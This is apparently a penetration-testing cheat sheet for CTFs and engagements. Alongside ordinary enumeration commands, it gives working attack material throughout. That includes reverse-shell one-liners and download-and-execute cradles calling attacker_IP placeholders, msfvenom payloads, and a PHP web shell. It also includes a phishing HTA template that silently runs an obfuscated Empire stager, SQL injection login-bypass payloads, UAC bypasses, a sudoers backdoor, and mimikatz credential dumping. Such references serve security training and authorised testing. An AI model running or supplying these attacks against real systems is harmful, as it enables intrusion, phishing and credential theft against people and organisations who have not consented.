# Pentest Common Commands Reference
This is a cheat sheet of common and useful commands I use for CTFs and Penetration Tests. This is primarily focused on offensive security operations in a network or against a single target host.

Prereqs - Download and install my tools from here:
- https://github.com/Z333RO/security-tools-public/blob/main/kali_autosetup/1st_download_tools_payloads.sh
- https://github.com/Z333RO/security-tools-public/blob/main/kali_autosetup/2nd_update_install.sh

# Web Enumeration 
For any directory/content discovery on CTFs or exams, recommend using the large raft wordlists as they often find hidden files and directories.
## dirb
```
dirb http://172.0.0.1/
dirb http://172.0.0.1/ /path/to/wordlist.txt
```

## ffuf
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://192.10.10.10/FUZZ -recursion -recursion-depth 1 -e .php -v

RATE LIMITING
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://192.10.10.10/FUZZ -recursion -recursion-depth 1 -e .php -v -t 5 -rate 2
```

## gobuster
```
gobuster dir -k -u http://10.10.10.13/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50
gobuster dir -k -u https://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,asp,aspx,html -t 40
gobuster dir -k -u https://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html -t 40
gobuster dir -k -u https://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s '200,204,301,302,307,403,500' -t 40

RATE LIMITING
gobuster dir -k -u https://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --threads 5 --delay 500ms
```

## feroxbuster
```
feroxbuster -u http://10.10.10.13/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
feroxbuster -u http://10.10.10.13/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --filter-status 404,301,403,401
feroxbuster -u http://10.10.10.13/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -C 404,301,403,401
feroxbuster -u http://10.10.10.13/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x pdf -x js,html -x php txt json,docx

Use for proxychains
feroxbuster -u http://10.10.10.13/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -C 404,301,403,401 --proxy socks5h://127.0.0.1:9050
```

## dirsearch

```
sudo dirsearch -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.13/ -e all -t 50
```

## nuclei
```
# Basic commands
nuclei -u http://10.10.10.13
nuclei -u http://website.com

# Run this over proxychains to scan a target on another subnet - ie chisel
proxychains -q nuclei -proxy 'socks5://localhost:1080' -u 172.16.1.19
```

## WPScan
```
wpscan --url http://10.10.10.10/wordpress/ --wp-content-dir -ep -et -eu
wpscan --disable-tls-checks --random-user-agent --url http://10.10.10.10/wp-login.php
wpscan -U users.txt -P /wordlist.txt --url http://10.10.110.100:8080/wordpress/
```

# Network Enumeration 

## naabu
```
Scan all ports
naabu -host 10.10.10.13 -p -

Scan list of hosts
naabu -l targets.txt -p -
```

## rustscan
```
Scan all ports
rustscan -a 10.10.10.13 --ulimit 5000 --range 1-65535 -- -sVC -Pn
rustscan -a 10.10.10.0/24 --ulimit 5000 --range 1-65535 -- -sVC -Pn
```

## nmap 
```
nmap -sVC 10.10.10.13
nmap -sVC 10.10.10.0/24
```
## pingsweep
```
Windows
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"

Linux
for i in {1..255} ;do (ping -c 1 172.16.2.$i | grep "bytes from"|cut -d ' ' - f4|tr -d ':' &);done

On Kali
fping -a -g 172.1.1.0/24 2>/dev/null | tee active_hosts_list.txt
```

## routes
```
Windows
route print

Linux
ip route show
route -n
```


## crackmapexec
```
crackmapexec smb 10.10.10.0/24 -u '' -p '' --shares
crackmapexec smb 10.10.110.0/24 -u users.txt -p password.txt continue-on-success
#add the --no-bruteforce if you want to match each line of the users.txt and password.txt file, might prevent from lockouts in AD network that will lockout accounts after x amount of attempts

crackmapexec smb targets.txt -u Administrator -H NTLM_HASH_HERE --local-auth

# the following grabs bloodhound data to ingest into bloodhound
crackmapexec ldap some.domain -u 'user' -p 'password' --bloodhound -c all -ns target_IP

```
## enum4linux
```
enum4linux -v target-ip
enum4linux -a target-ip

```

## enum4linux-ng
```
python3 enum4linux-ng.py 10.11.10.10
```

## Autorecon
Tool setup
```
git clone https://github.com/Tib3rius/AutoRecon

sudo apt install seclists curl dnsrecon enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf

cd AutoRecon
sudo python3 -m pip install -r requirements.txt
```

Fast autorecon
```
sudo python3 autorecon.py --nmap-append='-T4 --min-rate=5000' --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 target_ip_here -v
```

## smbmap
```
smbmap -u 'testuser' -p 'password123' -H 10.10.10.100 -R
smbmap -u testuser -p password123 -d some-domain.local -H 10.10.10.10
# The command below will go 5 directories deep into a specified folder/directory
smbmap -u 'testuser' -p 'password123' -d some-domain.local -H 10.10.10.10 --depth 5 -r some_directory_on_smb_share
# The command below will go 5 directories deep in all the directories available on the SMB share
smbmap -u 'testuser' -p 'password123' -d some-domain.local -H 10.10.10.10 --depth 5 -r /
```

## manspider
```
# Search for filenames that may contain creds
manspider 10.10.10.10 -f passw user admin account network login logon cred -d some-domain.local -u '' -p ''

# Search for interesting file extensions
manspider 10.10.10.10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml -d some-domain.local -u '' -p ''

# Search for file contents ie "passw" "login"
manspider --threads 256 10.10.10.10 -u '' -p '' -c passw user admin account network login logon cred password key keys ssh pass
```

## bloodhound
### Setup and configuration - attacker machine
```
sudo neo4j console
Go to localhost:7474 and change the default creds from neo4j:neo4j to neo4j:bloodhound - this is the neo4j console

# For subsequent runs, just run this command:
sudo neo4j console start
```
### Start bloodhound - attacker machine
```
bloodhound --no-sandbox
```

### Running sharphound to collect data on target machine
```
# Transfer sharphound.exe file to target machine and run as follows - this will run all collection methods except collecting data from Domain Controllers to minimize chance of detection
SharpHound.exe --CollectionMethods All --Domain my.target_domain.com --ExcludeDCs

# Run if you have some creds
SharpHound.exe --CollectionMethods All -d my.target.com --ldapusername some_user --ldappassword some_password
```

### Running NetExec to collect data on target machine for bloodhound
```
# make sure to install NetExec manually on kali machine
# You might need to go to /etc/hosts and put the FQDN or domain name with the DC IP before running the command below - a bloodhound .zip file will be available on your home folder in the .nxc folder
nxc ldap domain.name -u 'user' -p 'password' --bloodhound -c all -ns DC_IP
```

You will get a .zip file, so transfer that over from the target machine to your attacker machine, and while bloodhound is running on your kali machine, just drag the .zip file over to it for analysis

## smbclient
```
#smbclient null session or no password
smbclient -L 10.10.10.10 -N
rpcclient 10.10.10.10 -N
smbclient --no-pass //<IP>/<Folder>

#enumerate shares
smbclient -N -L //10.10.10.10
smbclient -L 10.10.10.10
smbclient -L 10.10.10.10 -U ''

#connect to share
smbclient -N //10.10.10.10/share_folder
smbclient \\\\10.10.10.10\\share_folder
smbclient //10.10.10.10/share_folder -U some_user
smbclient //10.10.10.10/share_folder -U ''
smbclient '\\10.50.10.10\share_folder' -u 'username' -p 'password' --option='client min protocol=NT1'
smbclient '\\10.50.10.10\share_folder' -u 'guest' -p '' --option='client min protocol=NT1'
```

## ldap search
```
ldapsearch -x -H ldap://10.10.10.10 -D '' -w '' -b "dc=hutch,dc=offsec"
ldapsearch -x -H ldap://10.10.10.10 -bx "dc=hutch,dc=offsec"
ldapsearch -x -H ldap://10.10.10.10 -D '' -w '' -b "dc=hutch,dc=offsec" | grep samaccountname:
#this command can find passwords in the description possibly
ldapsearch -x -H ldap://10.10.10.10 -D '' -w '' -b "dc=hutch,dc=offsec" | grep description
```

# Common and Useful Exploit Methods - Footholds
## File Upload - Reverse Shells 
```
# File upload via curl
curl -XPUT -d @shell.php http://website.com/webdav/shell.php -u 'admin:password' 
```

## xp_cmdshell

```
# First enable xp
impacket-mssqlclient user:password@10.10.10.10
enable_xp_cmdshell

# Attacker machine
msfvenom --list encoders
msfvenom --payload windows/meterpreter/reverse_http LHOST=attacker_IP LPORT=8080 --format psh | msfvenom --payload - --platform win --arch x86 --encoder base64 NOEXIT SYSWOW64

# Back to target machine
xp_cmdshell powershell -e base64_payload_from_msf_venom

```

Here is an alternate path
```
# Target Machine
impacket-mssqlclient user:password@10.10.10.10
EXEC sp_configure 'Show Advanced Options', 1; 
reconfigure; 
sp_configure; 
EXEC sp_configure 'xp_cmdshell', 1 
reconfigure;
xp_cmdshell "whoami"

# Attacker Machine - make sure you have invoke-powershelltcp.ps1 script
python3 -m http.server 80 
rlwrap nc -lvnp 4444

# Target Machine
xp_cmdshell "bitsadmin.exe /transfer /Download /priority Foreground http://attacker_IP:80/Invoke-PowerShellTcp.ps1 c:\windows\temp\Invoke-PowerShellTcp.ps1"
or
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker_IP/Invoke-PowerShellTcp.ps1\");"

Make sure you have the following at the end of the powershelltcp.ps1 script
Invoke-PowerShellTCP -Reverse -IPAddress attacker_IP -Port 4444
```

## RFI - Remote File Inclusion
Find a file path on URL that can read internal files on target (LFI) or read external pages from other sites (RFI). See below example on how to execute - (example is for a web server running on linux):

Attacker Machine - copy over the reverse shell payload to server folder.
```
cd /server
cp /usr/share/laudanum/php/php-reverse-shell.php .
```
Here make sure to edit the payload to be your attacker IP and port and run netcat.
```
gedit php-reverse-shell.php
python3 -m http.server 80
rlwrap nc -lvnp 443
```

Target machine - you can either directly browse to the file from browser or run curl command to trigger it, remember to have netcat running
```
Browse to http://target_IP/image.php?img=http://attacker_IP/php-reverse-shell.php
or
curl "http://target_IP/image.php?img=http://attacker_IP/php-reverse-shell.php"
```

## SSH - Command No Terminal 
Unix commands can be run against the target through SSH without having to login first. Use this if you have ssh keys or password but for some reason you can't seem to login or get a shell.
```
ssh hacker@10.10.10.1 "whoami"
ssh hacker@10.10.10.1 "ls -alt"
```

Can get a reverse shell with the following command.
```
ssh hacker@10.10.10.1 "bash -i >& /dev/tcp/10.0.0.3/1337 0>&1"
```

## Reverse Shells - Manual
### netcat
```
# On attacker machine
nc -lvnp 1337

# On target machine - sometimes you might need to run 'which nc' to find the binary - or you can just upload nc binary from kali and run it with ./nc after chmod +x
nc attacker_ip 1337 -e /bin/bash
nc attacker_ip 1337 -e /bin/sh

# Alternate methods on target machine
sh -i >& /dev/tcp/attacker_ip/1337 0>&1
bash -i >& /dev/tcp/attacker_ip/1337 0>&1
/bin/bash -c "bash -i>& /dev/tcp/attacker_ip/1337 0>&1"
```

### busybox netcat
```
Some machines may have busybox suite of tools installed, first run a check:
dpkg --list

Next run the following command to get a shell back using busybox:
busybox nc attacker_ip 1337 -e /bin/bash

NOTE: You could also check all the busybox binaries to see what can be used for privesc with GTFOBins:
busybox --list-full 
```

### php reverse shell - one liner
```
Upload to the target via file upload or manually copy paste in GUI:
<?php echo shell_exec($_GET['cmd']);?>

On target run this for a test:
http://domain.com/shell.php?c=whoami

Now run this:
http://domain.com/shell.php?c=nc attacker_ip 1337 -e /bin/bash
```

## MSFVenom commands
```
#Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=443 -f exe -o rev.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe -o payload.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=4444 -f dll > Dwrite.dll
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=443 -f exe > 'backdoor.exe'
msfvenom -p windows/meterpreter/bind_tcp LHOST=attacker_IP LPORT=7777 -f exe -o payload.exe

#Linux
msfvenom -p cmd/unix/reverse_netcat LHOST=attacker_IP LPORT=1337 -f raw -o reverse_shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=1337 -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tap0 LPORT=1337 -f elf > shell.elf

#Buffer overflows example
msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_IP LPORT=42424 -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0b\x0d"
msfvenom -p windows/meterpreter/bind_tcp LHOST=attacker_IP LPORT=7777 -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0b\x0d"

#misc
msfvenom -p php/meterpreter_reverse_tcp lhost=attacker_IP lport=445 -o meterpreter.php
msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=3000

#dll hijacking
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=5555 -f dll > shell.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=5555 -f dll > shell.dll
msfvenom -p windows/x64/shell/bind_tcp LHOST=attacker_IP LPORT=5555 -f dll > shell.dll
msfvenom -p windows/x64/shell/bind_tcp LHOST=attacker_IP LPORT=5555 -f dll > shell.dll
```
## Phishing
### hosted .hta file
Grab the index.hta file here: https://github.com/Z333RO/security-tools-public/blob/main/odds_ends/index.hta

1. Create an http listener on Empire
2. Create a stager and toggle "obfuscate" on in order to help bypass any AV.
3. Copy the powershell payload from stager and paste below
4. Run python3 -m http.server 80
5. Send to target via email - they will click on the link and trigger a connection back to your agent

```
<!DOCTYPE html>
<html>
<head>
    <HTA:APPLICATION
        icon="#"
        WINDOWSTATE="minimize"
        SHOWINTASKBAR="no"
        SYSMENU="no"
        CAPTION="no"
    />
    <script language="VBScript">
        Function var_func()
            Dim var_shell
            Set var_shell = CreateObject("Wscript.Shell")
            var_shell.run "ENTER YOUR EMPIRE POWERSHELL REVERSE SHELL PAYLOAD/STAGER HERE", 0, true
        End Function

        var_func
        self.close
    </script>
</head>
<body>
</body>
</html>
```

## SQL Injection Attacks
### SQL Injection Login Bypass
```
Username and password fields example:
admin:admin' or 1=1--
admin' or '1'='1:some_password

Inject into username or password fields:
admin' or 1=1#
admin' or 1=1-- -
' or '1'='1
admin' --
admin' #
' or 1=1 --
' or 'a'='a
' or 'true
') or ('1'='1
' or ''='
admin') --
') or ('x'='x
' or 1-- -
admin' OR '1'='1' -- -
admin') OR ('1'='1' -- -
admin' OR 'a'='a' -- -
' UNION SELECT 1, 'user', 'password' -- -
admin' OR SLEEP(5) -- -
' OR EXISTS(SELECT 1 FROM users WHERE username='admin')-- -
a' or 'b'='b
a' or 'b' LIKE 'b
a' or 'b' REGEXP 'b
'/**/or/**/1/**/=/**/1
admin'='admin
admin"="admin
' OR '1' LIKE '1
' OR 'a' LIKE 'a
' or '1'='1'/*
') or ('1'='1'/*
') or ('1'='1'#
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'-- -
admin' AND (SELECT 1)=(SELECT 1)
admin' AND (SELECT 1)=(SELECT 2)
admin' or '1' is null -- -
' OR 1=1 -- -
"password":{"password": 1}
```

### Union SQL Injection
Identify Union SQL Injection by running the following until you get an error:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

Error will occur when there are more than the amount of columns to sort by. 

Alternate method - you can run this as well to check for errors:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

If you determine that there are 4 columns, run the following to check for data types such as strings and integers for each column:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

In this example, you have determined there are 2 columns, that are both strings, and based on error messages, there is a users table. Therefore you should be able to retreive the usernames and passwords from the users table:
```
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+'a','a'--
' UNION SELECT username, password FROM users--
```

To get multiple values in one column for specific scenarios, you can run this command:
```
' UNION SELECT username || '~' || password FROM users--

This will output the following example:
example_username~example_password
```

To check for database type and version:
```
MySQL
SELECT @@version
example:
' UNION SELECT @@version--

Oracle
SELECT * FROM v$version

PostGresQL
SELECT version() 
```


# File Transfer Methods
## Linux - wget
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE
wget http://atacker_ip:80/name_of_file.php
```

## Windows - certutil
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE
certutil -urlcache -f http://attacker_ip:80/name_of_file.exe
```

## Windows - powershell
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE (various commands by line - pick what you want)
powershell wget http://attacker_ip/nc.exe -outfile nc.exe

# Run "powershell -ep bypass" first
IEX (New-Object Net.WebClient).DownloadString("http://attacker_ip/PowerView.ps1")
```

## Windows - LOLBAS
```
# bitadmin file download
bitsadmin.exe /transfer /Download /priority Foreground http://attacker_IP:80/name_of_file.exe

# SMB shared folders download
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe

```

## smbserver
Check your kali machine on /tmp/smbshare and you can now transfer files to and from the target. On target machine, if you have RDP, you can easily check the network share on file explorer and transfer over files
```
# Attacker machine
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# Target machine
net use n: \\192.168.220.133\share /user:test test
```

## RDP Mount
First one is with user and pass, second line is for user and NT hash. Once you successfully connect, you should see on the file explorer the network share and you can transfer files to and from your kali machine to target. Files will appear in your /tmp folder.
```
xfreerdp /v:target_IP /u:user /p:password9 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
xfreerdp /v:target_IP /u:user /pth:NT_HASH /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

## NFS Mount
```
showmount -e <ip of target>

# Mount
mount -t nfs 10.10.10.10:/path/to/folder/on/target /path/to/mount/folder/on/my/machine
mount -t nfs -o vers=4 10.10.10.10:/home/some_user /home/kali/new_back -o nolock

# Unmount
sudo umount -t nfs 10.10.10.10:/home /mnt/some_folder
```

## SSH - scp
### Linux Target
Transfer from your attacker machine to the target
```
#Using ssh key
scp -i id_rsa shell.elf root@10.10.10.100:/tmp/shell.elf
```

Transfer from target to your attacker machine
```
scp -i id_rsa root@10.10.10.100:/home/root/credential.pgp ~/loot/target_machine/
```

### Windows Target
Transfer from your attacker machine to the target
```
scp winPEAS.exe admin@10.10.10.100:C:\\ProgramData\\winp.exe
```
Transfer from target to your attacker machine
```
scp admin@10.10.10.100:C:/ProgramData/file.txt /tmp/file.txt
```

## curl
```
# First make sure you have python server running on your attacker machine
# On the target terminal
curl http://attacker_ip/nc -o /tmp/nc

# You should now have nc on the /tmp folder
```

## FTP Recursive Download - wget
If for some reason when you try to access RTP, it's freezing, you can execute this command to wget all the files immediately to your machine without having to first login and download manually.
```
wget --recursive --ftp-user=anonymous --ftp-password=any --no-passive-ftp ftp://target_IP
```


# Cracking and Bruteforce

## Hydra
```
# SSH 
hydra -l testuser -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.10.10 ssh

# Base64 encode http post bruteforce
hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://10.10.10.10:8080/service/session:username=^USER64^&password=^PASS64^:C=/:F=403'
```

## John
```
unshadow passwd shadow > crack_me.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crack_me.txt
```

## Hashcat
```
# Crack kerberos ticket
hashcat -m 13100 kerb_crack.txt /usr/share/wordlists/rockyou.txt
```

## FFUF
```
On burpsuite, save an http request to a file called req.txt, you can do this through repeater or just through the http history. Then on the "password=" parameter on the request body, replace the input with the string "FUZZ".

Now run the following command and you should be able to bruteforce the password of a user:
ffuf -request req.txt --request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt

NOTE: You might have to filter the results. Just run the usual FFUF filter tags.
```

## WPScan Bruteforce
Run the following to bruteforce the login with a user and pass list:
```
wpscan -U users.txt -P /home/kali/loot/pass.txt --url http://target_ip:80/wordpress_directory_just_replace_this/
```

## Cracking SAM locally with impacket-secretsdump
```
reg save hklm\sam sam.txt
reg save hklm\system system.txt
reg save hklm\security security.txt
# Now transfer these files to your kali machine
impacket-secretsdump -sam sam.txt -security security.txt -system system.txt LOCAL
```

# Local Enumeration for Privesc
## Linux
### Linux Password Mining
```
findstr /si password *.doc *.txt *.ini *.config
find / -name authorized_keys 2> /dev/null find / -name id_rsa 2> /dev/null

grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
grep --color=auto -rnw '/home/user' -ie "PASS" --color=always 2> /dev/null
find /etc -type f -exec grep -i -I "PASS" {} /dev/null \;
find /home/user -type f -exec grep -i -I "PASS" {} /dev/null \;

cat /home/user/.bash_history | grep "pass"
su root
history
```
### System Enumeration
```
#For SUID GTFOBins exploits/privesc
find / -perm -u=s -type f 2>/dev/null
or
find / -perm -4000 2>/dev/null

netstat -tulnp
netstat -ano

cat /etc/*-release
lsb_release -a
hostnamectl
uname -a
ps aux | grep root
dpkg -l
rpm -qa
sudo -l
```

### Scheduled Tasks
```
crontab
cat /etc/crontab

# Enumeration on cron jobs
crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*

crontab -l
ls -al /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

```

### Linpeas
You can just run the linpeas.sh file on the target machine to get it to run.
```
chmod +x linpeas.sh
./linpeas.sh
```
Some instances, you can't download linpeas to the target machine. The work around is to just copy the .sh file contents, open nano or vim on the target machine and run it.
```
vim
ctrl+shift+v
:q linpeas.sh
./linpeas.sh
```

### Linux Exploit Suggester
```
chmod +x linux-exploit-suggester.sh 
/tmp/linux-exploit-suggester.sh
```

### LSE - Linux Smart Enumerator
```
Enumeration based on verbosity levels - can use it in increments:
./lse.sh
./lse.sh -l1
./lse.sh -l2

Might be too verbose so use this:
./lse.sh -l2 | less -r
```

### PsPY
```
chmod +x pspy64
./pspy64
```

## Windows
### Password mining
```
findstr /si password *.doc *.txt *.ini *.config
dir /s *pass* == *cred* == *ssh* == *.config*
findstr /spin "password" *.* -
dir /s *pass* == *cred* == *vnc* == *.config*
C:\\Windows\Panther\Unattend\Unattended.xml
C:\\Windows\Panther\Unattdended.xml
C:\\sysprep.inf
C:\\sysprep\sysprep.xml
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### System Enumeration
```
ipconfig /all
route print
netstat -ano      # Determine services
netstat -tulnp

whoami
whoami /priv
whoami /groups
net user
net user <username>
net localgroup administrators
```

### Winpeas
```
winpeasANY.exe
```

### wesng - Windows Exploit Suggester Next Generation 
Download wesng from git repo.
```
git clone https://github.com/bitsadmin/wesng --depth 1
```
Make sure you run systeminfo on the target machine and output it to a file called systeminfo.txt - then run the following commands:
```
#first update the vuln db
python3 wesng.py --update

#run the following to find vulns for privesc
python3 wesng.py systeminfo.txt

#if you run the command above you will get a very verbose output - the following command will filter for vulns with known public exploits and privilege escalation - the "-c" is just for color
python3 wes.py systeminfo.txt -e -i "privilege"

# This will just filter for known public exploits
python3 wes.py systeminfo.txt -e -c

#You can filter further for vulnerabilitites that are critical
python3 wes.py systeminfo.txt -s critical -c
```

### Windows Exploit Suggester (Old)
```
# windows-exploit-suggester setup and dependencies install - install pip2 on kali machine
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
rm get-pip.py
pip2 install xlrd==1.2.0

# Go into the windows exploit suggester folder and run the following to setup exploit-suggester
python2 windows-exploit-suggester.py --update

# After you run the above command, it will create a database - run the following command after you run `systeminfo` command on the target Windows machine. Make sure to copy paste the output from the windows machine to a file called "sysinfo.txt"
./windows-exploit.suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt
```

### adPEAS
Refer to the documentation/repo if needed for additional commands. 
NOTE: It might be better to run the light version of the script as the version with bloodhound has issues uploading the zip file to bloodhound. Might be better to just run sharphound manually on the target.
```
Import-Module .\adPEAS.ps1
or
. .\adPEAS.ps1
or
gc -raw .\adPEAS.ps1 | iex
or
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

NOTE: You might have to run powershell -ep bypass and then import the script with the above commands

To run it just do the following:
Invoke-adPEAS
```

### certipy
Use to abuse ADCS certificates.

Install:
```
pip3 install certipy-ad
```

Check for potential misconfigured certificates. Check the .txt output after running:
```
certipy-ad find -u user@domain.com -p 'password' -vulnerable -dc-ip 10.10.10.100
```

With a compromised hash, forge an admin cert using NTLM of an account:
```
certipy-ad req -u 'USER' -hashes ':NTLM_HASH_HERE' -dc-ip 10.10.10.100 -ca some-domain-certificate-here-CA -template cert_template_here -upn administrator -target domain.com -key-size 4096 -debug
```

Run the command to see the admin NTLM hash:
```
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'domain.com' -dc-ip 10.10.10.100
```


# Common and Useful Exploit Methods - PrivEsc
## PwnKit
```
chmod +x PwnKit
./PwnKit
```

## Password /etc/passwd overwrite
NOTE: Copy and create backup of the original /etc/passwd file - this applies if you can overwrite that file to create your own password for a user.

`ls -la /etc/passwd `< this confirms that anyone can write to this file

`openssl passwd "P@ssword" `< this will generate a hash that you will enter into the /etc/passwd file on the second column replacing the "x". The "x" tells /etc/passwd to look for the password in the shadow file, but by replacing it with a hash you will be able to change the password of any user, in this case root to anything you want.

`nano /etc/passwd` < now replace the x with the password hash

`su root` < switch to the root user and enter the new password

## runas
```
runas /user:domain\username cmd
password_here
```

## runasCs.exe - bypass UAC
```
Use runasCs.exe to get a shell back to attaker machine with UAC bypass and elevated privs
runasCs.exe username_here password_here -r attacker_IP:1337 cmd --bypass-uac
```

## UAC Bypass 1
```
certutil -urlcache -f http://attacker_IP:80/Invoke-EventViewer.ps1 Invoke-EventViewer.ps1
certutil -urlcache -f http://attacker_IP:80/nc.exe nc.exe
Import-Module .\Invoke-EventViewer.ps1
Invoke-EventViewer "C:\windows\tasks\nc.exe attacker_IP 4242 -e C:\Windows\System32\cmd.exe"
```

## UAC Bypass 2
```
Grab nc.exe from the attacker server and transfer to the target machine - see file transfer methods section:
wget http://attacker_ip/nc.exe -outfile nc.exe

Run on the target machine to get a shell back to your attacker machine via netcat:
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\admin\Desktop\nc.exe 10.8.2.31 1337 -e powershell.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```


## Add user to sudoers - allow sudo without password
Scenario: You run pspy or linpeas, and notice that the script "cleanup.sh" is being run by the root user via cronjob or this might be the only script that the current user can run. You try to add a command to get a reverse shell but can't seem to do it on that script. Next step maybe to become root by adding the current user "some_user" to the /etc/sudoers file. This will allow you to simply run "sudo su" and become root once the script with the following command runs and allows the current user to run sudo commands without a password.
```
# run this command to add the extra line of code on cleanup.sh to add "some_user" into the sudoers file.
echo "echo 'some_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" > cleanup.sh
```

After that, just wait for the cronjob to run to execute the script or you can run it yourself if you have the privs.

## Potatoes
First run whoami /priv and check you have SeImpersonatePrivilege

### God Potato
```
python3 -m http.server
certutil.exe -urlcache -split -f http://<attacker_IP>:80/god_potato.exe god_potato.exe
certutil.exe -urlcache -split -f http://<attacker_IP>:80/nc.exe nc.exe
rlwrap nc -lvnp 443
.\god_potato.exe -cmd "nc.exe <attacker_IP> 443 -e cmd.exe"
```
### Juicy Potato
Grab CLSID here: https://github.com/ohpe/juicy-potato/tree/master/CLSID -- run systeminfo and pick the proper ID for the server
```
# Run this to execute rev shell with msfvenom payload
certutil -urlcache -split -f http://10.10.14.26:80/JuicyPotato.exe JuicyPotato.exe
rlwrap nc -lvnp 31337
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.26 lport=31337 -f exe > rev_shell.exe
certutil -urlcache -split -f http://10.10.14.26:80/rev_shell.exe rev_shell.exe
certutil -urlcache -split -f http://10.10.14.26:80/JuicyPotato.exe JuicyPotato.exe
JuicyPotato.exe -l 1337 -p rev_shell.exe -t  * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# Run this to execute netcat rev shell to attacker machine
# Run this on attacker machine
rlwrap nc -lvnp 8888

Run this on target machine after you transfer over nc.exe and JuicyPotato.exe
C:\Users\testuser\Documents> .\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\users\testuser\Documents\nc.exe -e cmd.exe <attacker_IP> 8888" -l 1337 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
```

## KeyTabExtract - extract NTLM hashes from .keytab files
```
./keytabextract.py krb5.keytab
```

# Post Exploitation 
## Mimikatz
```
mimikatz.exe
privilege::debug
token::elevate

# Common commands to run through and dump hashes/creds

sekurlsa::logonpasswords
lsadump::secrets
lsadump::sam
lsadump::sam /dump
lsadump::sam /patch
lsadump::cache
lsadump::lsa /patch
lsadump::lsa /inject
sekurlsa::pth
```

## Golden Ticket Attack w/ Mimikatz
First get the Domain SID - the IP is the IP of the DC server
```
impacket-lookupsid domain/some_user@10.10.20.10 | grep "Domain SID"

# Refer to alternate commands below.
```

